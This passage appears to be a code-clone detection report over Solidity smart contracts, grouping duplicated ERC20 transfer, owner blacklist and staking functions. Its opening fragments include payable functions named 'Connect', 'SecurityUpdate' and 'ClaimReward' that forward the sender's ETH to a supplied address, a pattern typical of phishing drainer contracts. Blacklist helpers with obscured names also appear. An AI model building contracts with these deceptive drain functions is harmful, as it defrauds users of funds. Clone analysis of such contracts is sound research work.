<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="23" endline="23" pcid="7851">
  function Connect(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="21" endline="21" pcid="480">
  function SecurityUpdate(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xfbacfdfa1d4baa6f4f01d7405afb91ecf7e0dd26.sol" startline="15" endline="15" pcid="9169">
  function Connect(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="15" endline="15" pcid="474">
  function ClaimReward(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
</class>

<class classid="69" nclones="2" nlines="6" similarity="80">
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="24" endline="29" pcid="482">
    function acceptOwnership() public {
        require(msg.sender == newOwner, "Ownable: caller is not the new owner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="88" endline="93" pcid="7133">
     function acceptOwnership() public {
         require(msg.sender == newOwner);
         emit OwnershipTransferred(owner, newOwner);
         owner = newOwner;
         newOwner = address(0);
     }
</source>
</class>

<class classid="70" nclones="8" nlines="7" similarity="100">
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="71" endline="78" pcid="484">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0xedb32c55d9f85d5fa88098574ed97edbcf9afbbf.sol" startline="38" endline="45" pcid="8679">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="61" endline="68" pcid="7527">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="66" endline="73" pcid="1231">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x848fff4055be44647b20d1a0826e3762e91362be.sol" startline="38" endline="45" pcid="4955">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x34e8a53b0759c2a732610a3126814ac69b692349.sol" startline="46" endline="53" pcid="1654">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x2e07ae2b85fbdd60251df13d6d39a64125cbabe9.sol" startline="38" endline="45" pcid="1357">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0xa3a9799e42e46aeb47cc263fe9334f9170127fb1.sol" startline="38" endline="45" pcid="5948">
    function _transfer(address _from, address _to, uint256 _value) internal notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
</class>

<class classid="71" nclones="9" nlines="4" similarity="100">
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="80" endline="83" pcid="485">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x34e8a53b0759c2a732610a3126814ac69b692349.sol" startline="55" endline="58" pcid="1655">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x2e07ae2b85fbdd60251df13d6d39a64125cbabe9.sol" startline="47" endline="50" pcid="1358">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="54" endline="57" pcid="8658">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xedb32c55d9f85d5fa88098574ed97edbcf9afbbf.sol" startline="47" endline="50" pcid="8680">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="70" endline="73" pcid="7528">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x848fff4055be44647b20d1a0826e3762e91362be.sol" startline="47" endline="50" pcid="4956">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="75" endline="78" pcid="1232">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xa3a9799e42e46aeb47cc263fe9334f9170127fb1.sol" startline="47" endline="50" pcid="5949">
    function transfer(address _to, uint256 _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
</class>

<class classid="72" nclones="9" nlines="6" similarity="100">
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="85" endline="90" pcid="486">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xa3a9799e42e46aeb47cc263fe9334f9170127fb1.sol" startline="52" endline="57" pcid="5950">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x2e07ae2b85fbdd60251df13d6d39a64125cbabe9.sol" startline="52" endline="57" pcid="1359">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xedb32c55d9f85d5fa88098574ed97edbcf9afbbf.sol" startline="52" endline="57" pcid="8681">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="59" endline="64" pcid="8659">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="80" endline="85" pcid="1233">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x848fff4055be44647b20d1a0826e3762e91362be.sol" startline="52" endline="57" pcid="4957">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x34e8a53b0759c2a732610a3126814ac69b692349.sol" startline="60" endline="65" pcid="1656">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="75" endline="80" pcid="7529">
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        require(_value <= allowance[_from][msg.sender], "ERC20: transfer amount exceeds allowance");
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
</source>
</class>

<class classid="73" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="98" endline="101" pcid="488">
    function aTbL(address _address) public onlyOwner {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="88" endline="91" pcid="7531">
    function aTbL(address _address) public onlyOwner {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="93" endline="96" pcid="1235">
    function aTbL(address _address) public onlyOwner {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0x34e8a53b0759c2a732610a3126814ac69b692349.sol" startline="73" endline="76" pcid="1658">
    function aTbL(address _address) public onlyOwner {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
</class>

<class classid="74" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="103" endline="105" pcid="489">
    function rFbL(address _address) public onlyOwner {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="93" endline="95" pcid="7532">
    function rFbL(address _address) public onlyOwner {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="98" endline="100" pcid="1236">
    function rFbL(address _address) public onlyOwner {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0x34e8a53b0759c2a732610a3126814ac69b692349.sol" startline="78" endline="80" pcid="1659">
    function rFbL(address _address) public onlyOwner {
        blacklist[_address] = false;
    }
</source>
</class>

<class classid="75" nclones="4" nlines="27" similarity="96">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="109" endline="147" pcid="490">
    function stake(uint256 amount1, uint256 timeperiod) public {
        require(timeperiod >= 0 && timeperiod <= 3, "Invalid Time Period");
        require(amount1 >= minimumStakeToken, "stake more than minimum amount");
        uint256 NDSVAL = getPriceinUSD();
        uint256 amount = amount1.sub((amount1.mul(totalFee)).div(percentDivider));
        uint256 rewardtokenPrice = (amount.mul(NDSVAL)).div(1e18);
        if (!Stakers[msg.sender].alreadyExists) {
            Stakers[msg.sender].alreadyExists = true;
            StakersID[totalStakers] = msg.sender;
            totalStakers++;
        }

        stakeToken.transferFrom(msg.sender, address(this), amount1);

        uint256 index = Stakers[msg.sender].stakeCount;
        Stakers[msg.sender].totalStakedTokenUser = Stakers[msg.sender]
            .totalStakedTokenUser
            .add(amount);
        totalStakedToken = totalStakedToken.add(amount);
        stakersRecord[msg.sender][index].unstaketime = block.timestamp.add(
            Duration[timeperiod]
        );
        stakersRecord[msg.sender][index].staketime = block.timestamp;
        stakersRecord[msg.sender][index].amount = amount;
        stakersRecord[msg.sender][index].reward = rewardtokenPrice
            .mul(Bonus[timeperiod])
            .div(percentDivider);
        stakersRecord[msg.sender][index].persecondreward = stakersRecord[
            msg.sender
        ][index].reward.div(Duration[timeperiod]);

        stakersRecord[msg.sender][index].rewardTokenAmount = rewardtokenPrice;
        stakersRecord[msg.sender][index].lastharvesttime = 0;
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].reward;
        stakersRecord[msg.sender][index].harvestreward = 0;
        Stakers[msg.sender].stakeCount++;

        emit STAKE(msg.sender, amount);
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="109" endline="147" pcid="7548">
    function stake(uint256 amount1, uint256 timeperiod) public {
        require(timeperiod >= 0 && timeperiod <= 3, "Invalid Time Period");
        require(amount1 >= minimumStakeToken, "stake more than minimum amount");
        uint256 ZDAIVAL = getPriceinUSD();
        uint256 amount = amount1.sub((amount1.mul(totalFee)).div(percentDivider));
        uint256 rewardtokenPrice = (amount.mul(ZDAIVAL)).div(1e9);
        if (!Stakers[msg.sender].alreadyExists) {
            Stakers[msg.sender].alreadyExists = true;
            StakersID[totalStakers] = msg.sender;
            totalStakers++;
        }

        stakeToken.transferFrom(msg.sender, address(this), amount1);

        uint256 index = Stakers[msg.sender].stakeCount;
        Stakers[msg.sender].totalStakedTokenUser = Stakers[msg.sender]
            .totalStakedTokenUser
            .add(amount);
        totalStakedToken = totalStakedToken.add(amount);
        stakersRecord[msg.sender][index].unstaketime = block.timestamp.add(
            Duration[timeperiod]
        );
        stakersRecord[msg.sender][index].staketime = block.timestamp;
        stakersRecord[msg.sender][index].amount = amount;
        stakersRecord[msg.sender][index].reward = rewardtokenPrice
            .mul(Bonus[timeperiod])
            .div(percentDivider);
        stakersRecord[msg.sender][index].persecondreward = stakersRecord[
            msg.sender
        ][index].reward.div(Duration[timeperiod]);

        stakersRecord[msg.sender][index].rewardTokenAmount = rewardtokenPrice;
        stakersRecord[msg.sender][index].lastharvesttime = 0;
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].reward;
        stakersRecord[msg.sender][index].harvestreward = 0;
        Stakers[msg.sender].stakeCount++;

        emit STAKE(msg.sender, amount);
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="109" endline="147" pcid="7091">
    function stake(uint256 amount1, uint256 timeperiod) public {
        require(timeperiod >= 0 && timeperiod <= 3, "Invalid Time Period");
        require(amount1 >= minimumStakeToken, "stake more than minimum amount");
        uint256 MNSVAL = getPriceinUSD();
        uint256 amount = amount1.sub((amount1.mul(totalFee)).div(percentDivider));
        uint256 rewardtokenPrice = (amount.mul(MNSVAL)).div(1e9);
        if (!Stakers[msg.sender].alreadyExists) {
            Stakers[msg.sender].alreadyExists = true;
            StakersID[totalStakers] = msg.sender;
            totalStakers++;
        }

        stakeToken.transferFrom(msg.sender, address(this), amount1);

        uint256 index = Stakers[msg.sender].stakeCount;
        Stakers[msg.sender].totalStakedTokenUser = Stakers[msg.sender]
            .totalStakedTokenUser
            .add(amount);
        totalStakedToken = totalStakedToken.add(amount);
        stakersRecord[msg.sender][index].unstaketime = block.timestamp.add(
            Duration[timeperiod]
        );
        stakersRecord[msg.sender][index].staketime = block.timestamp;
        stakersRecord[msg.sender][index].amount = amount;
        stakersRecord[msg.sender][index].reward = rewardtokenPrice
            .mul(Bonus[timeperiod])
            .div(percentDivider);
        stakersRecord[msg.sender][index].persecondreward = stakersRecord[
            msg.sender
        ][index].reward.div(Duration[timeperiod]);

        stakersRecord[msg.sender][index].rewardTokenAmount = rewardtokenPrice;
        stakersRecord[msg.sender][index].lastharvesttime = 0;
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].reward;
        stakersRecord[msg.sender][index].harvestreward = 0;
        Stakers[msg.sender].stakeCount++;

        emit STAKE(msg.sender, amount);
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="109" endline="147" pcid="5290">
    function stake(uint256 amount1, uint256 timeperiod) public {
        require(timeperiod >= 0 && timeperiod <= 3, "Invalid Time Period");
        require(amount1 >= minimumStakeToken, "stake more than minimum amount");
        uint256 CGPUVAL = getPriceinUSD();
        uint256 amount = amount1.sub((amount1.mul(totalFee)).div(percentDivider));
        uint256 rewardtokenPrice = (amount.mul(CGPUVAL)).div(1e18);
        if (!Stakers[msg.sender].alreadyExists) {
            Stakers[msg.sender].alreadyExists = true;
            StakersID[totalStakers] = msg.sender;
            totalStakers++;
        }

        stakeToken.transferFrom(msg.sender, address(this), amount1);

        uint256 index = Stakers[msg.sender].stakeCount;
        Stakers[msg.sender].totalStakedTokenUser = Stakers[msg.sender]
            .totalStakedTokenUser
            .add(amount);
        totalStakedToken = totalStakedToken.add(amount);
        stakersRecord[msg.sender][index].unstaketime = block.timestamp.add(
            Duration[timeperiod]
        );
        stakersRecord[msg.sender][index].staketime = block.timestamp;
        stakersRecord[msg.sender][index].amount = amount;
        stakersRecord[msg.sender][index].reward = rewardtokenPrice
            .mul(Bonus[timeperiod])
            .div(percentDivider);
        stakersRecord[msg.sender][index].persecondreward = stakersRecord[
            msg.sender
        ][index].reward.div(Duration[timeperiod]);

        stakersRecord[msg.sender][index].rewardTokenAmount = rewardtokenPrice;
        stakersRecord[msg.sender][index].lastharvesttime = 0;
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].reward;
        stakersRecord[msg.sender][index].harvestreward = 0;
        Stakers[msg.sender].stakeCount++;

        emit STAKE(msg.sender, amount);
    }
</source>
</class>

<class classid="76" nclones="4" nlines="12" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="149" endline="177" pcid="491">
    function unstake(uint256 index) public {
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        require(
            stakersRecord[msg.sender][index].unstaketime < block.timestamp,
            "cannot unstake after before duration"
        );

        if(!stakersRecord[msg.sender][index].withdrawan){
            harvest(index);
        }
        stakersRecord[msg.sender][index].unstaked = true;

        stakeToken.transfer(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
        
        totalUnStakedToken = totalUnStakedToken.add(
            stakersRecord[msg.sender][index].amount
        );
        Stakers[msg.sender].totalUnstakedTokenUser = Stakers[msg.sender]
            .totalUnstakedTokenUser
            .add(stakersRecord[msg.sender][index].amount);

        emit UNSTAKE(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="149" endline="177" pcid="7092">
    function unstake(uint256 index) public {
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        require(
            stakersRecord[msg.sender][index].unstaketime < block.timestamp,
            "cannot unstake after before duration"
        );

        if(!stakersRecord[msg.sender][index].withdrawan){
            harvest(index);
        }
        stakersRecord[msg.sender][index].unstaked = true;

        stakeToken.transfer(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
        
        totalUnStakedToken = totalUnStakedToken.add(
            stakersRecord[msg.sender][index].amount
        );
        Stakers[msg.sender].totalUnstakedTokenUser = Stakers[msg.sender]
            .totalUnstakedTokenUser
            .add(stakersRecord[msg.sender][index].amount);

        emit UNSTAKE(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="149" endline="177" pcid="7549">
    function unstake(uint256 index) public {
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        require(
            stakersRecord[msg.sender][index].unstaketime < block.timestamp,
            "cannot unstake after before duration"
        );

        if(!stakersRecord[msg.sender][index].withdrawan){
            harvest(index);
        }
        stakersRecord[msg.sender][index].unstaked = true;

        stakeToken.transfer(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
        
        totalUnStakedToken = totalUnStakedToken.add(
            stakersRecord[msg.sender][index].amount
        );
        Stakers[msg.sender].totalUnstakedTokenUser = Stakers[msg.sender]
            .totalUnstakedTokenUser
            .add(stakersRecord[msg.sender][index].amount);

        emit UNSTAKE(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="149" endline="177" pcid="5291">
    function unstake(uint256 index) public {
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        require(
            stakersRecord[msg.sender][index].unstaketime < block.timestamp,
            "cannot unstake after before duration"
        );

        if(!stakersRecord[msg.sender][index].withdrawan){
            harvest(index);
        }
        stakersRecord[msg.sender][index].unstaked = true;

        stakeToken.transfer(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
        
        totalUnStakedToken = totalUnStakedToken.add(
            stakersRecord[msg.sender][index].amount
        );
        Stakers[msg.sender].totalUnstakedTokenUser = Stakers[msg.sender]
            .totalUnstakedTokenUser
            .add(stakersRecord[msg.sender][index].amount);

        emit UNSTAKE(
            msg.sender,
            stakersRecord[msg.sender][index].amount
        );
    }
</source>
</class>

<class classid="77" nclones="4" nlines="17" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="179" endline="211" pcid="492">
    function harvest(uint256 index) public {
        require(
            !stakersRecord[msg.sender][index].withdrawan,
            "already withdrawan"
        );
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        uint256 rewardTillNow;
        uint256 commontimestamp;
        (rewardTillNow,commontimestamp) = realtimeRewardPerBlock(msg.sender , index);
        stakersRecord[msg.sender][index].lastharvesttime =  commontimestamp;
        rewardToken.transfer(
            msg.sender,
            rewardTillNow
        );
        totalClaimedRewardToken = totalClaimedRewardToken.add(
            rewardTillNow
        );
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].remainingreward.sub(rewardTillNow);
        stakersRecord[msg.sender][index].harvestreward = stakersRecord[msg.sender][index].harvestreward.add(rewardTillNow);
        Stakers[msg.sender].totalClaimedRewardTokenUser = Stakers[msg.sender]
            .totalClaimedRewardTokenUser
            .add(rewardTillNow);

        if(stakersRecord[msg.sender][index].harvestreward == stakersRecord[msg.sender][index].reward){
            stakersRecord[msg.sender][index].withdrawan = true;

        }

        emit HARVEST(
            msg.sender,
            rewardTillNow
        );
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="179" endline="211" pcid="5292">
    function harvest(uint256 index) public {
        require(
            !stakersRecord[msg.sender][index].withdrawan,
            "already withdrawan"
        );
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        uint256 rewardTillNow;
        uint256 commontimestamp;
        (rewardTillNow,commontimestamp) = realtimeRewardPerBlock(msg.sender , index);
        stakersRecord[msg.sender][index].lastharvesttime =  commontimestamp;
        rewardToken.transfer(
            msg.sender,
            rewardTillNow
        );
        totalClaimedRewardToken = totalClaimedRewardToken.add(
            rewardTillNow
        );
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].remainingreward.sub(rewardTillNow);
        stakersRecord[msg.sender][index].harvestreward = stakersRecord[msg.sender][index].harvestreward.add(rewardTillNow);
        Stakers[msg.sender].totalClaimedRewardTokenUser = Stakers[msg.sender]
            .totalClaimedRewardTokenUser
            .add(rewardTillNow);

        if(stakersRecord[msg.sender][index].harvestreward == stakersRecord[msg.sender][index].reward){
            stakersRecord[msg.sender][index].withdrawan = true;

        }

        emit HARVEST(
            msg.sender,
            rewardTillNow
        );
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="179" endline="211" pcid="7550">
    function harvest(uint256 index) public {
        require(
            !stakersRecord[msg.sender][index].withdrawan,
            "already withdrawan"
        );
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        uint256 rewardTillNow;
        uint256 commontimestamp;
        (rewardTillNow,commontimestamp) = realtimeRewardPerBlock(msg.sender , index);
        stakersRecord[msg.sender][index].lastharvesttime =  commontimestamp;
        rewardToken.transfer(
            msg.sender,
            rewardTillNow
        );
        totalClaimedRewardToken = totalClaimedRewardToken.add(
            rewardTillNow
        );
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].remainingreward.sub(rewardTillNow);
        stakersRecord[msg.sender][index].harvestreward = stakersRecord[msg.sender][index].harvestreward.add(rewardTillNow);
        Stakers[msg.sender].totalClaimedRewardTokenUser = Stakers[msg.sender]
            .totalClaimedRewardTokenUser
            .add(rewardTillNow);

        if(stakersRecord[msg.sender][index].harvestreward == stakersRecord[msg.sender][index].reward){
            stakersRecord[msg.sender][index].withdrawan = true;

        }

        emit HARVEST(
            msg.sender,
            rewardTillNow
        );
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="179" endline="211" pcid="7093">
    function harvest(uint256 index) public {
        require(
            !stakersRecord[msg.sender][index].withdrawan,
            "already withdrawan"
        );
        require(!stakersRecord[msg.sender][index].unstaked, "already unstaked");
        uint256 rewardTillNow;
        uint256 commontimestamp;
        (rewardTillNow,commontimestamp) = realtimeRewardPerBlock(msg.sender , index);
        stakersRecord[msg.sender][index].lastharvesttime =  commontimestamp;
        rewardToken.transfer(
            msg.sender,
            rewardTillNow
        );
        totalClaimedRewardToken = totalClaimedRewardToken.add(
            rewardTillNow
        );
        stakersRecord[msg.sender][index].remainingreward = stakersRecord[msg.sender][index].remainingreward.sub(rewardTillNow);
        stakersRecord[msg.sender][index].harvestreward = stakersRecord[msg.sender][index].harvestreward.add(rewardTillNow);
        Stakers[msg.sender].totalClaimedRewardTokenUser = Stakers[msg.sender]
            .totalClaimedRewardTokenUser
            .add(rewardTillNow);

        if(stakersRecord[msg.sender][index].harvestreward == stakersRecord[msg.sender][index].reward){
            stakersRecord[msg.sender][index].withdrawan = true;

        }

        emit HARVEST(
            msg.sender,
            rewardTillNow
        );
    }
</source>
</class>

<class classid="78" nclones="4" nlines="21" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="229" endline="251" pcid="494">
    function realtimeRewardPerBlock(address user, uint256 blockno) public view returns (uint256,uint256) {
        uint256 ret;
        uint256 commontimestamp;
            if (
                !stakersRecord[user][blockno].withdrawan &&
                !stakersRecord[user][blockno].unstaked
            ) {
                uint256 val;
                uint256 tempharvesttime = stakersRecord[user][blockno].lastharvesttime;
                commontimestamp = block.timestamp;
                if(tempharvesttime == 0){
                    tempharvesttime = stakersRecord[user][blockno].staketime;
                }
                val = commontimestamp - tempharvesttime;
                val = val.mul(stakersRecord[user][blockno].persecondreward);
                if (val < stakersRecord[user][blockno].remainingreward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][blockno].remainingreward;
                }
            }
        return (ret,commontimestamp);
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="229" endline="251" pcid="7552">
    function realtimeRewardPerBlock(address user, uint256 blockno) public view returns (uint256,uint256) {
        uint256 ret;
        uint256 commontimestamp;
            if (
                !stakersRecord[user][blockno].withdrawan &&
                !stakersRecord[user][blockno].unstaked
            ) {
                uint256 val;
                uint256 tempharvesttime = stakersRecord[user][blockno].lastharvesttime;
                commontimestamp = block.timestamp;
                if(tempharvesttime == 0){
                    tempharvesttime = stakersRecord[user][blockno].staketime;
                }
                val = commontimestamp - tempharvesttime;
                val = val.mul(stakersRecord[user][blockno].persecondreward);
                if (val < stakersRecord[user][blockno].remainingreward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][blockno].remainingreward;
                }
            }
        return (ret,commontimestamp);
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="229" endline="251" pcid="5294">
    function realtimeRewardPerBlock(address user, uint256 blockno) public view returns (uint256,uint256) {
        uint256 ret;
        uint256 commontimestamp;
            if (
                !stakersRecord[user][blockno].withdrawan &&
                !stakersRecord[user][blockno].unstaked
            ) {
                uint256 val;
                uint256 tempharvesttime = stakersRecord[user][blockno].lastharvesttime;
                commontimestamp = block.timestamp;
                if(tempharvesttime == 0){
                    tempharvesttime = stakersRecord[user][blockno].staketime;
                }
